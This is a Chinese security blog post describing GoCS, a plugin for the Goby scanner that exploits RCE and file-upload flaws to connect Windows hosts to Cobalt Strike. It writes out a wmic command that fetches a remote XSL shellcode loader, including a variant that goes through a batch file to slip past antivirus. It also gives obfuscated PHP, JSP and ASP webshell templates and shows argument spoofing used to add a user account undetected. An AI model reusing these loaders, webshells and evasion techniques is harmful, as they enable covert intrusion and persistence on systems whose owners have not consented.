> 原文链接: https://www.anquanke.com//post/id/250799 


# 简单免杀绕过和利用上线的 GoCS


                                阅读量   
                                **29018**
                            
                        |
                        
                                                                                    



[![](https://p0.ssl.qhimg.com/t0128e803dfaf2921ca.png)](https://p0.ssl.qhimg.com/t0128e803dfaf2921ca.png)



**前言：** Goby 可以快速准确的扫描资产，并直观呈现出来。同时经过上次 EXP 计划过后，PoC&amp;EXP 也增加了许多。在实战化漏洞扫描后，对于高危漏洞的利用，不仅仅只在 whoami 上，而是要进入后渗透阶段，那么对于 Windows 机器而言，上线 CS 是必不可少的操作，会让后渗透如鱼得水。此插件只运用了简单的利用方式上线 CS，希望师傅们能够提供想法和建议把它更为完善，源码中有详细的注释，可供师傅们快速理解。



## 0×01 插件使用

### <a class="reference-link" name="1.1%20%E6%8F%92%E4%BB%B6%E6%95%88%E6%9E%9C"></a>1.1 插件效果

[![](https://p0.ssl.qhimg.com/t01766041d2ced09c5d.gif)](https://p0.ssl.qhimg.com/t01766041d2ced09c5d.gif)

### <a class="reference-link" name="1.2%20%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"></a>1.2 使用方法

1.在工具栏导入 CS 的 32 位 RAW 的 payload 文件 (attacks – &gt; packages – &gt; payload generator – &gt; output:raw 后缀为 bin)，将免杀后的文件放入 VPS 中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fed9479d5c8b482f.gif)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013dbeb0609670d2a7.gif)

2.在 Goby 插件配置中设置 VPS 免杀文件地址，在实际使用中也可以进行实时的更改。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e2babfad54088024.gif)

3.在漏洞利用详情页中点击 GoCS

4.选择一个利用方式和文件形式,根据实际情况更改 payload 进行绕过拦截

点击 GO 即可发包利用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01766041d2ced09c5d.gif)

> 注：现无法只在目标为 Windows 的机器才显示该插件，还需要用户自己判断一下。



## 0×02 插件开发

### <a class="reference-link" name="2.1%20%E4%B8%BB%E4%BD%93%E6%A1%86%E6%9E%B6"></a>2.1 主体框架

```
├── .gitignore          // 忽略构建输出和node_modules文件
├── README.md           // 插件介绍文档
├── CHANGELOG.md        // 插件更新日志文档
├── src
│   └── CS.png         //CS的图片
│   └── assets   //layui
│   └── extension.js      // 插件源代码
│   └── Gopass.html    //工具栏制作免杀xsl文件
│   └── GoCS.html      //漏洞利用页面进行发包利用上线CS
├── package.json         // 插件配置清单
├── node_modules      //引入模块
```

### <a class="reference-link" name="2.2%20%E5%AE%83%E4%BB%AC%E7%9A%84%E7%88%B7%E7%88%B7%20package.json"></a>2.2 它们的爷爷 package.json

该插件由工具栏的 GoPass.html 和漏洞利用的 index.html 进行大部分工作，所以我先简单介绍它们的爷爷 package.json

[![](https://p2.ssl.qhimg.com/t01cafd6b6876d90dbb.png)](https://p2.ssl.qhimg.com/t01cafd6b6876d90dbb.png)

### <a class="reference-link" name="2.3%20%E5%AE%83%E4%BB%AC%E7%9A%84%E7%88%B8%E7%88%B8%20extension.js"></a>2.3 它们的爸爸 extension.js

具体注释在源代码中，在 Goby 中下载 GoCS 后可在根目录下 \extensions 中找到，这只分析重点。<br>
这个页面是父页面(我的理解)在引入模块时直接引用 let fs = require(‘fs’)；或者加 parent 也可以。

点击 Command 为 GoPass 后进行的操作来跳出 GoPass.html：

```
//在工具栏的图标点击过后入口
goby.registerCommand('GoPass',function(content)`{`
    //获取子页面路径
    let path = __dirname + "/GoPass.html"
    //打开子页面并配置长宽
    goby.showIframeDia(path, "GoPass", "666", "500");

`}`)
//在工具栏的图标点击过后结束
```

进行发包和利用 EXP 的代码：

```
//此段代码是摘取Go0p师傅的Goby_exp插件源码

    //创建Gexp类进行发包获取漏洞详情和利用漏洞
    class Gexp `{`
    //引入包和模块
      constructor() `{`
        this.fs = require('fs')
        this.request = require('request')
        this.path = require('path')
      `}`
      //初始化函数之类的吧
      init() `{`
        this.host = this.data.server_host;
        this.port = this.data.server_port;
        this.username = this.data.authUsername;
        this.password = this.data.authPassword;
       `}`
        //获取配置主要用于获取username和password还有代理端口
       getServerInfo() `{`
            //对目录下得配置文件进行读取返回
            let config_info = this.path.join(__dirname, '../../../config/config.json');
                //读取文件操作
            this.data = JSON.parse(this.fs.readFileSync(config_info, 'utf-8'));
                //返回应该是json类型可以后面直接用
            return this.data;
        `}`

         //点击按钮时获取你点击的漏洞详情
        getPOCInfo(vulname, proxystr) `{`
            this.init();
            //进行发包操作获取Goby本地的返回包，其中有漏洞详情，json类型进行后面处理
            return new Promise((resolve, reject) =&gt; `{`
                //发包配置一系列的参数
                this.request(`{`
                  url: `http://$`{`this.host`}`:$`{`this.port`}`/api/v1/getPOCInfo`,
                  method: 'POST',
                  auth: `{`
                    'user': this.username,
                    'pass': this.password,
                  `}`,
                  proxy: proxystr,
                  json: `{` "vulname": vulname`}`
                 `}`, function (error, response, body) `{`
                     //成功过后会进行返回漏洞详情
                     if (!error &amp;&amp; response.statusCode == 200) `{`
                        //成功状态获取返回值
                        resolve(body);
                     `}` else `{`
                        //失败状态返回错误详情
                        reject(error)
                     `}`
                `}`);
            `}`)
         `}`
            //发包利用漏洞，主要用来更改exp的参数
      debugExp(post_data, proxystr) `{`
            this.init();
            //进行发包操作和本地Goby进行交互，利用更改exp的值进行利用
            return new Promise((resolve, reject) =&gt; `{`
                //发包构造一系列参数
              this.request(`{`
                url: `http://$`{`this.host`}`:$`{`this.port`}`/api/v1/debugExp`,
                method: 'POST',
                auth: `{`
                  'user': this.username,
                  'pass': this.password,
                `}`,
                proxy: proxystr,
                json: post_data
              `}`, function (error, response, body) `{`
                if (!error &amp;&amp; response.statusCode == 200) `{`
                  //输出返回的内容
                  // console.log(body);
                  resolve(body);
                `}` else `{`
                  reject(error)
                `}`
              `}`);
        `}`)
      `}`

    `}`
//构造Gexp类结束
```

### <a class="reference-link" name="2.4%20%E5%AE%83%E4%BB%AC%E8%87%AA%E5%B7%B1"></a>2.4 它们自己

**<a class="reference-link" name="2.4.1%20GoPass.html%20%E7%94%A8%E6%9D%A5%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%20xsl%20%E6%96%87%E4%BB%B6"></a>2.4.1 GoPass.html 用来生成免杀 xsl 文件**

这个文件主要就是将 bin 文件进行 base64 加密后和 xsl 文件进行拼接，生成一个 GoPass.xsl 文件，供后面进行远程加载。

Xsl 文件的是使用 cactusTorch 作为加载器加载 shellcode，再运用 wmic 进行远程不落地执行 shellcode。由于无文件落地的木马可以附加到任何进程里面执行，而且传统安全软件是基于文件检测的,对目前无文件落地木马检查效果差，所以该插件采用了此形式进行上线 CS。

而原版本的 xsl 文件生成后就会被杀软报毒，那么加入 &lt;!——&gt; 注释符号进行简单免杀绕过，此处只绕过基本的杀软。

[![](https://p3.ssl.qhimg.com/t01b0e5993ee5a5739e.png)](https://p3.ssl.qhimg.com/t01b0e5993ee5a5739e.png)

同时在重要函数名上也如此。

[![](https://p2.ssl.qhimg.com/t018885472d73966c1e.png)](https://p2.ssl.qhimg.com/t018885472d73966c1e.png)

此处只讨论静态免杀，在 vt 上效果如下。

[![](https://p2.ssl.qhimg.com/t019b2ee84960f52b36.png)](https://p2.ssl.qhimg.com/t019b2ee84960f52b36.png)

效果是不够的好，加入 &lt;!——&gt; 如同 P 图，P 得越多，越… 根据上面的绕过举一反三过后的免杀如下。

[![](https://p4.ssl.qhimg.com/t0113e9001259104780.png)](https://p4.ssl.qhimg.com/t0113e9001259104780.png)

这几个感觉是执行了文件，只把一个字母大写，代码不能执行了它们就不报毒了，所以后期还需要加强免杀。

[![](https://p4.ssl.qhimg.com/t01216dd94a0e65d3cd.png)](https://p4.ssl.qhimg.com/t01216dd94a0e65d3cd.png)

**<a class="reference-link" name="2.4.2%20index.html%20%E7%94%A8%E6%9D%A5%E7%94%9F%E6%88%90%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8A%E7%BA%BF%20CS"></a>2.4.2 index.html 用来生成漏洞利用上线 CS**

这个文件主要用来，调用 extension.js 文件中的 Gexp 类，获取 PoC 的参数进行更改后调用 EXP 进行发包利用，其中利用方式有 RCE 和 upload 两种，文件形式有 php，asp，jsp三种(以后会加入 aspx)，源码中有具体的注释。

此处因为是子页面使用引入模块时必须加入 parent

```
let fs = parent.require('fs');
let goby = parent.goby;
```

同时如果你使用 exec 函数调用 cmd 也是 Goby.exe 进行调用的，生成文件会在 Goby 的根目录下面，不指定目录写文件也是一样。

初次写 js 的师傅注意，下拉框因为是 div 修饰过的，不能再使用原生的事件进行监听，要使用 layui 的语法进行 select 监听事件。

```
//select监听事件开始
//layui的监听事件和原生select不一样

layui.use(['form'], function () `{`
    var form = layui.form;

    //下拉框改变事件开始
    //layui的调用写法，因为select采用的是layui的样式使用要用它的写法不能用原生的
    //id为vlul的下拉框的值改变后触发
    form.on('select(vlul)', function (data) `{`
        //调用函数主要用来更新textarea中的内容
        changeE();
    `}`);
    //id为txt的下拉框的值改变后触发
    form.on('select(txt)', function (data) `{`
        //调用函数主要用来更新textarea中的内容
        changeE();
    `}`);
    //下拉框改变事件结束


`}`);
//select监听事件结束
```

以 php 为例，漏洞利用 upload 是上传写入 php 代码执行 cmd 调用 wmic 远程加载运行 shellcode，RCE 是默认可以执行系统 dos 命令的情况下，调用 wmic 进行远程加载运行 shellcode (如果是代码执行漏洞还需要自己添加 system() 之类的调用 cmd 的函数)

最开始的 xsl 文件有了简单的免杀后，能不能成功上线还得看最后一步 wmic 的命令，正常 wmic 命令是 wmic os get /format:”[http://yourIP/a.xsl](http://yourIP/a.xsl)“

不用想，这肯定会被某全家桶拦截，所以我们必须绕过拦截，那么使用用到烂的 echo 加管道符 | 来试试

echo os get /format:”[http://yourIP/a.xsl”|wmic](http://yourIP/a.xsl%22%7Cwmic)

本地 cmd 执行不会被拦，但是 Upload 利用时候，写入页面后，再加载页面时候会被拦，这意外么？毫不意外。但是这里有趣的是，其实这里绕过了但是没有完全绕过，根据高级的食材往往只需简单烹饪这一道理，所以我决定简单烹饪，将它写入 bat 文件中本地执行，最后发现某全家桶毫无拦截。所以页面中不调用 wmic，而是把它写入 bat，本地去执行 wmic 这样就不会被拦截。

[![](https://p4.ssl.qhimg.com/t017775f0323cf20b25.gif)](https://p4.ssl.qhimg.com/t017775f0323cf20b25.gif)

所以最后命令为 echo ^echo os get /format:”[http://yourIP/a.xsl”^|wmic&gt;&gt;1.bat&amp;&amp;1.bat](http://yourIP/a.xsl%22%5E%7Cwmic&gt;&gt;1.bat&amp;&amp;1.bat)

最后来看看在某斯基，某全家桶，某管家，某绒的监督下，不落地执行 shellcode 会是什么样子。

[![](https://p4.ssl.qhimg.com/t017775f0323cf20b25.gif)](https://p4.ssl.qhimg.com/t017775f0323cf20b25.gif)

看着 6 秒没有反应，还以为是被 某斯基 杀了，结果发现没有。上线后如果执行敏感操作，如创建用户，可以考虑用 argue 参数污染。

> 使用参考[https://www.freesion.com/article/3342904336/](https://www.freesion.com/article/3342904336/)

**<a class="reference-link" name="%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93%20net"></a>参数污染 net**

```
argue net xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**<a class="reference-link" name="%E6%9F%A5%E7%9C%8B%E6%B1%A1%E6%9F%93%E7%9A%84%E5%8F%82%E6%95%B0"></a>查看污染的参数**

```
argue
```

**<a class="reference-link" name="%E7%94%A8%E6%B1%A1%E6%9F%93%E7%9A%84%20net%20%E6%89%A7%E8%A1%8C%E6%95%8F%E6%84%9F%E6%93%8D%E4%BD%9C"></a>用污染的 net 执行敏感操作**

```
execute net user test2 root123 /add
```

全程某全家桶是没有进行拦截的

[![](https://p5.ssl.qhimg.com/t01f849adf0a8116a40.png)](https://p5.ssl.qhimg.com/t01f849adf0a8116a40.png)

[![](https://p3.ssl.qhimg.com/t016a12345ffdfad21b.png)](https://p3.ssl.qhimg.com/t016a12345ffdfad21b.png)

原理简单来讲也如同 P 图，原本执行 net，但是污染后 command 却是 net xxxxxxxxxx，达到绕过。

你在使用中肯定会遇到一些小问题，比如，wmic 加载了一个没有开放的端口就会出现

[![](https://p1.ssl.qhimg.com/t01423211be1df5b2d7.png)](https://p1.ssl.qhimg.com/t01423211be1df5b2d7.png)

那么最好的解决办法就是不去解决，等待一分钟过后就可以了，它们都会自己退出。这告诉了我们一件事情，一定记得去防火墙设置里面开放端口。

[![](https://p5.ssl.qhimg.com/t01f2f5b777243ce044.png)](https://p5.ssl.qhimg.com/t01f2f5b777243ce044.png)

讲完了 cmd 命令的绕过那么就开始 upload 中 Webshell 的绕过。

Php 是参考冰蝎的回调函数进行利用的 php 语句。

```
let phpshell = "&lt;?php @call_user_func(base64_decode(\"c3lzdGVta\"),\"" + wmicCMDshell + "\");"
```

Jsp 基础免杀是参考的 [@yzddMr6](https://github.com/yzddMr6) 师傅的 [https://yzddmr6.tk/posts/webshell-bypass-jsp/](https://yzddmr6.tk/posts/webshell-bypass-jsp/) 文章

```
let jspshell = "&lt;%@ page contentType=\"text/html;charset=UTF-8\" import=\"javax.xml.bind.DatatypeConverter\" language=\"java\" %&gt;&lt;%Class rt = Class.forName(new String(DatatypeConverter.parseHexBinary(\"6a6176612e6c616e672e52756e74696d65\")));Process e = (Process) rt.getMethod(new String(DatatypeConverter.parseHexBinary(\"65786563\")), String.class).invoke(rt.getMethod(new String(DatatypeConverter.parseHexBinary(\"67657452756e74696d65\"))).invoke(null), \"" + wmicCMDshell + "\");%&gt; ";
```

Asp 是简单利用的 chr 字符加大写，不能免杀，希望会 asp 的师傅能够指导一下。

```
let aspshell = "&lt;%response.write server.createobject(\"wscript.sh\"&amp;Chr(69)&amp;\"ll\").ExEc(\"" + wmicAsp +"\").stdout.readall%&gt;"
```



## 0×03 总结

第一次编写插件和编写 js 文件，无疑是一次面向百度的编程，总体还是不错，学到了很多。遗憾的是 asp 并没有免杀，还希望会 asp 的师傅指导一下。这个版本很基础，很简单进行利用，所以只能在简单环境下利用，希望后面能加入更多的元素，让这个插件适应更多复杂环境。感谢 Goby 团队的 @青淮 @叶落凡尘 [@go0p](https://github.com/go0p) 师傅的帮助指导。

插件开发文档及Goby开发版下载：

[https://gobies.org/docs.html](https://gobies.org/docs.html)

关于插件开发在B站都有详细的教学，欢迎大家到弹幕区合影~

[https://www.bilibili.com/video/BV1u54y147PF/](https://www.bilibili.com/video/BV1u54y147PF/)

> 文章来自Goby社区成员：hututuZH，转载请注明出处。
下载Goby内测版，请关注微信公众号：GobySec
下载Goby正式版，请关注网址：[https://gobies.org](https://gobies.org)

[![](https://p4.ssl.qhimg.com/t0180a5827128e8b473.png)](https://p4.ssl.qhimg.com/t0180a5827128e8b473.png)
